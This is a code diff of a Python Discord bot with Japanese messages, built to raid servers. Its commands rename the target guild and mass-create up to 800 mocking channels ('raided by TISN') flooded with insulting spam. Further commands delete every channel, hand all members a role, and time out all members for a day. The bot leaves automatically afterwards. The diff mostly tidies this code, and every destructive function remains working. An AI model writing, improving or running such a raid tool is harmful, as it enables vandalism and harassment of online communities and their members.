@@ -1,24 +1,19 @@
+import sys
+print("🔧 起動準備中...")
+
 import discord
 from discord import ui
 from discord.ext import commands
 from datetime import datetime, timezone, timedelta
 import os
 import asyncio
-import random
 
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True
-
-bot = commands.Bot(command_prefix="!", intents=intents)
-
+# ========== ✅ 最初に全部定義 ==========
+GUILD_ID = 1537420800766771332
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
 BATCH_SIZE = 50
 CREATE_INTERVAL = 0.0
-MAX_PARALLEL = 30
-GUILD_ID = 1537420800766771332
-
 MAX_CHANNELS = 800
 MAX_MESSAGES_PER_CHANNEL = 100
 
@@ -41,6 +36,11 @@ COMBINED_TEXT = (
     "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
 )
 
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 stop_flag = asyncio.Event()
 rate_limit_hit = asyncio.Event()
@@ -60,9 +60,8 @@ async def notify_rate_limit():
         user = await bot.fetch_user(initiator_id)
         if user:
             await user.send(
-                "⚠️ **DiscordのAPI制限を受けました**\n"
-                "処理を自動停止しました。\n"
-                "`!check` コマンドで解除時間を確認してください。"
+                "⚠️ **API制限を受けました**\n"
+                "処理を自動停止しました。`!check` で確認を。"
             )
     except:
         pass
@@ -86,18 +85,14 @@ async def stop_only(message: str = None):
             pass
 
 
-# ✅ !stop用：最優先で強制退出
 async def force_leave_all(message: str = None):
     global active_jobs
-    # ✅ まず全部止める
     stop_flag.set()
     rate_limit_hit.clear()
     active_jobs = 0
     for t in background_tasks:
         t.cancel()
     background_tasks.clear()
-
-    # ✅ メッセージ（失敗しても続行）
     if message and target_guild:
         try:
             ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
@@ -105,8 +100,6 @@ async def force_leave_all(message: str = None):
                 await ch.send(message)
         except:
             pass
-
-    # ✅ 何が何でも即退出！
     if target_guild:
         try:
             await target_guild.leave()
@@ -126,7 +119,7 @@ async def try_auto_leave(message: str = None):
         background_tasks.clear()
         if message and target_guild:
             try:
-                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
+                ch = target_guild.system_channel or next((c for c in target_guild.text_channels), None)
                 if ch:
                     await ch.send(message)
             except:
@@ -138,13 +131,13 @@ async def try_auto_leave(message: str = None):
                 pass
 
 
-class HackView(ui.View):
+class HackView(discord.ui.View):
     def __init__(self, guild):
         super().__init__(timeout=None)
         self.guild = guild
 
-    @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💥")
-    async def start_callback(interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💥")
+    async def start_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         global initiator_id, target_guild, active_jobs, created_channels
         await interaction.response.defer(ephemeral=True)
         if active_jobs > 0:
@@ -153,7 +146,7 @@ class HackView(ui.View):
         target_guild = interaction.guild
         created_channels = 0
         active_jobs += 1
-        await interaction.followup.send("💥 実行開始！", ephemeral=False)
+        await interaction.followup.send("実行開始！", ephemeral=False)
         bot.loop.create_task(run_full(target_guild, auto_leave=True))
 
 
@@ -175,11 +168,11 @@ async def send_messages_task(channel):
                     await notify_rate_limit()
                     mins = int(retry // 60)
                     secs = int(retry % 60)
-                    await force_leave_all(f"⚠️ API制限を受けました。解除まで約{mins}分{secs}秒です。")
+                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                 return
             await asyncio.sleep(1)
         except:
-            await asyncio.sleep(1)
+            return
 
 
 async def run_full(guild, auto_leave=False):
@@ -188,17 +181,12 @@ async def run_full(guild, auto_leave=False):
         await guild.edit(name=SERVER_NAME)
     except:
         pass
-
     while not stop_flag.is_set() and created_channels < MAX_CHANNELS:
         batch = []
         for i in range(BATCH_SIZE):
             if created_channels >= MAX_CHANNELS or stop_flag.is_set():
                 break
-            batch.append(
-                guild.create_text_channel(
-                    f"{CHANNEL_NAME} {created_channels+1}"
-                )
-            )
+            batch.append(guild.create_text_channel(f"{CHANNEL_NAME} {created_channels+1}"))
             created_channels += 1
         try:
             chans = await asyncio.gather(*batch)
@@ -211,21 +199,18 @@ async def run_full(guild, auto_leave=False):
                     await notify_rate_limit()
                     mins = int(retry // 60)
                     secs = int(retry % 60)
-                    await force_leave_all(f"⚠️ API制限を受けました。解除まで約{mins}分{secs}秒です。")
+                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                 return
             await asyncio.sleep(1)
             continue
-
         for ch in chans:
             t = bot.loop.create_task(send_messages_task(ch))
             background_tasks.add(t)
             t.add_done_callback(background_tasks.discard)
-
         if not stop_flag.is_set():
             await asyncio.sleep(CREATE_INTERVAL)
-
     if auto_leave and not rate_limit_hit.is_set():
-        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。全処理完了後にBotを退出します。")
+        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。Bot退出します。")
 
 
 async def run_boost(guild, auto_leave=False):
@@ -235,11 +220,7 @@ async def run_boost(guild, auto_leave=False):
         for i in range(BATCH_SIZE):
             if created_channels >= MAX_CHANNELS or stop_flag.is_set():
                 break
-            batch.append(
-                guild.create_text_channel(
-                    f"{CHANNEL_NAME} {created_channels+1}"
-                )
-            )
+            batch.append(guild.create_text_channel(f"{CHANNEL_NAME} {created_channels+1}"))
             created_channels += 1
         try:
             chans = await asyncio.gather(*batch)
@@ -252,21 +233,18 @@ async def run_boost(guild, auto_leave=False):
                     await notify_rate_limit()
                     mins = int(retry // 60)
                     secs = int(retry % 60)
-                    await force_leave_all(f"⚠️ API制限を受けました。解除まで約{mins}分{secs}秒です。")
+                    await force_leave_all(f"⚠️ API制限 あと約{mins}分{secs}秒")
                 return
             await asyncio.sleep(1)
             continue
-
         for ch in chans:
             t = bot.loop.create_task(send_messages_task(ch))
             background_tasks.add(t)
             t.add_done_callback(background_tasks.discard)
-
         if not stop_flag.is_set():
             await asyncio.sleep(CREATE_INTERVAL)
-
     if auto_leave and not rate_limit_hit.is_set():
-        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。全処理完了後にBotを退出します。")
+        await try_auto_leave(f"✅ 完了 合計{created_channels}チャンネル作成。Bot退出します。")
 
 
 async def delete_all_channels(guild):
@@ -299,25 +277,27 @@ async def hacking_animation(channel):
     return msg
 
 
+# ========== ✅ 起動時処理 ==========
 @bot.event
 async def on_ready():
     print(f"✅ 起動完了: {bot.user}")
     try:
-        guild = discord.Object(id=GUILD_ID)
-        await bot.tree.sync(guild=guild)
-        print("✅ コマンド登録完了")
+        guild_obj = discord.Object(id=GUILD_ID)
+        await bot.tree.sync(guild=guild_obj)
+        print("✅ コマンド登録完了！")
     except Exception as e:
-        print(f"⚠️ コマンド登録失敗: {e}")
-        print("💡 Botを applications.commands 付きで再招待してください")
+        print(f"⚠️ コマンド登録失敗: {type(e).__name__}: {e}")
+        print("💡 再招待が必要な可能性大")
 
 
 @bot.event
 async def on_member_remove(member):
     global initiator_id, target_guild
     if initiator_id and target_guild and member.id == initiator_id:
-        await force_leave_all("👋 実行者が退出したため全処理を停止しBotを終了します。")
+        await force_leave_all("👋 実行者退出のため停止・退出")
 
 
+# ========== ✅ コマンド全部 ==========
 @bot.command()
 async def check(ctx):
     global rate_limit_reset_at
@@ -329,29 +309,26 @@ async def check(ctx):
             rate_limit_hit.clear()
             rate_limit_reset_at = None
             emb = discord.Embed(title="✅ API制限状況", color=0x00ff00)
-            emb.add_field(name="状態", value="🔓 制限は解除されています", inline=False)
+            emb.add_field(name="状態", value="🔓 制限解除済み", inline=False)
         else:
             m = sec // 60
             s = sec % 60
             emb = discord.Embed(title="⚠️ API制限状況", color=0xff0000)
-            emb.add_field(name="状態", value="🔒 API制限中です", inline=False)
-            emb.add_field(name="解除予定", value=f"あと **{m}分 {s}秒**", inline=False)
-            emb.add_field(name="解除予定時刻", value=rate_limit_reset_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=False)
+            emb.add_field(name="状態", value="🔒 API制限中", inline=False)
+            emb.add_field(name="解除まで", value=f"あと **{m}分 {s}秒**", inline=False)
     else:
         emb = discord.Embed(title="✅ API制限状況", color=0x00ff00)
-        emb.add_field(name="状態", value="🔓 制限はかかっていません", inline=False)
-        emb.add_field(name="実行中タスク数", value=f"{active_jobs} 件", inline=False)
-    await ctx.send(embed=emb, ephemeral=True)
+        emb.add_field(name="状態", value="🔓 制限なし", inline=False)
+        emb.add_field(name="実行中タスク", value=f"{active_jobs}件", inline=False)
+    await ctx.send(embed=emb)
 
 
-# ✅ 新しい !erase
 @bot.command()
 async def erase(ctx):
-    """🗑️ 全チャンネル削除 → 「おちゅかれwww」作成 → Botは居残り"""
+    """🗑️ 全削除→おちゅかれwww作成→居残り"""
     await ctx.send("🗑️ チャンネル全削除中...")
     await delete_all_channels(ctx.guild)
     await ctx.guild.create_text_channel("おちゅかれwww")
-    await ctx.send("✅ 全削除完了 → 「おちゅかれwww」作成済み")
 
 
 @bot.command()
@@ -363,7 +340,7 @@ async def start(ctx):
         await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
     created_channels = 0
     active_jobs += 1
-    await ctx.send(f"🚀 !start 実行開始（最大{MAX_CHANNELS}チャンネル / {MAX_MESSAGES_PER_CHANNEL}件ずつ）\n✅ 全処理完了後に自動退出します。")
+    await ctx.send(f"start 実行開始（最大{MAX_CHANNELS}チャンネル）\n✅ 完了後に自動退出します。")
     bot.loop.create_task(run_full(ctx.guild, auto_leave=True))
 
 
@@ -374,16 +351,15 @@ async def boost(ctx):
     target_guild = ctx.guild
     created_channels = 0
     active_jobs += 1
-    await ctx.send(f"🚀 !boost 実行開始（最大{MAX_CHANNELS}チャンネル / {MAX_MESSAGES_PER_CHANNEL}件ずつ）\n✅ 全処理完了後に自動退出します。")
+    await ctx.send(f"boost 実行開始（最大{MAX_CHANNELS}チャンネル）\n✅ 完了後に自動退出します。")
     bot.loop.create_task(run_boost(ctx.guild, auto_leave=True))
 
 
-# ✅ 修正版！絶対に止めて抜ける
 @bot.command()
 async def stop(ctx):
-    """🛑 即時全停止 → 確実に退出"""
+    """🛑 即停止→確実に退出"""
     await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
-    await force_leave_all("🛑 !stop により全処理停止・Bot退出。")
+    await force_leave_all("🛑 !stop により停止・退出。")
 
 
 @bot.command()
@@ -407,9 +383,12 @@ async def admin(ctx):
     for m in ctx.guild.members:
         if not m.bot:
             try:
-                await m.add_roles(discord.utils.get(ctx.guild.roles, name="TISN管理者"))
+                role = discord.utils.get(ctx.guild.roles, name="TISN管理者")
+                if role:
+                    await m.add_roles(role)
             except:
                 pass
+    await ctx.send("✅ 管理者ロール付与完了")
 
 
 @bot.command(name="to")
@@ -420,11 +399,18 @@ async def timeout_all(ctx):
                 await m.edit(timed_out_until=discord.utils.utcnow() + timedelta(days=1))
             except:
                 pass
-    await ctx.send("✅ 全員を1日タイムアウトしました")
+    await ctx.send("✅ 全員を1日タイムアウト")
 
 
+# ========== ✅ 起動 ==========
 TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 if not TOKEN:
-    raise SystemExit("TOKENが設定されていません")
+    print("❌ DISCORD_BOT_TOKEN が設定されていません！")
+    sys.exit(1)
 
-bot.run(TOKEN)
+print("🔧 Bot起動中...")
+try:
+    bot.run(TOKEN)
+except Exception as e:
+    print(f"❌ 起動エラー: {type(e).__name__}: {e}")
+    sys.exit(1)
